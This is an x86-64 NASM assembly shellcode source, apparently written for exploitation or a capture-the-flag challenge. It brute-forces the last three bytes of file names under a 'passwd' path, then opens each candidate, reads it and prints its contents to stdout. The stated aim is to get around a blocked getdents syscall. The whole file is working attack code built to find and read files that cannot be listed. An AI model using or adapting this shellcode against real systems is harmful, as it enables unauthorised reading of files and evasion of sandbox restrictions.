
;
; Author: BITAM Salim (github.com/soolidsnake)
; Lenght: 213 bytes
; Purpose: brute force files and read their content
; usefull when you can't use syscall to read directory content 'getdents'
; nasm -f elf64 bf_files.asm; ld -m elf_x86_64 -s -o bf_files bf_files.o
;

section .text
  global _start

_start:

	xor rsi, rsi
	xor rdi, rdi
	xor rdx, rdx


	;create rbp
	mov rbp, rsp
	add rsp, 0x100

	xor rax, rax
	push rax
	mov rbx, 'XX'
	push rbx
	mov rbx, 'passwd_X'
	push rbx	
	mov rbx, 'passwd//'
	push rbx
	
;	

	mov rsi, rsp

	; FIRST LOOP
	mov QWORD [rbp+0x8], 0x00;cpt
	MOV BYTE [rsp+0x11], 0x00;reset at position x

	LOOP1:
		mov QWORD [rbp+0x10], 0x00;cpt
		MOV BYTE [rsp+0x10], 0x00;reset at position x

		LOOP2:
			mov QWORD [rbp+0x18], 0x00;cpt
			MOV BYTE [rsp+0x0f], 0x00;reset at position x

			LOOP3:


				; ACTUAL CODE

				;open file
				xor rsi, rsi
				mov rdi, rsp
				mov eax, 0x02
				syscall
				
				test rax, rax; test is file opened 
				jl ERROR_OPEN; successfully


				;read content of file
				mov rdi, rax
				lea rsi, [rbp+0x200]
				mov dl, 0x30
				xor rax, rax 
				syscall				


				;write content to stdout
				mov rdi, 0x01
				mov dl, al; get number of read bytes
				mov al, 0x01
				syscall 


				; ACTUAL CODE	


				ERROR_OPEN:
				add BYTE [rsp+0x0f], 1;add at position 0x0f

				add QWORD [rbp+0x18], 1;inc k
				cmp QWORD [rbp+0x18], 0xff;cmp k
				jl LOOP3

			add BYTE [rsp+0x10], 1;add at position 0x10

			add QWORD [rbp+0x10], 1;inc j
			cmp QWORD [rbp+0x10], 0xff;cmp j
			jl LOOP2	


		add BYTE [rsp+0x11], 1;add at position 0x11

		add QWORD [rbp+0x8], 1;inc i
		cmp QWORD [rbp+0x8], 0xff;cmp i
		jl LOOP1


	;exit

	mov rax, 60
	xor rdi, rdi
	syscall 
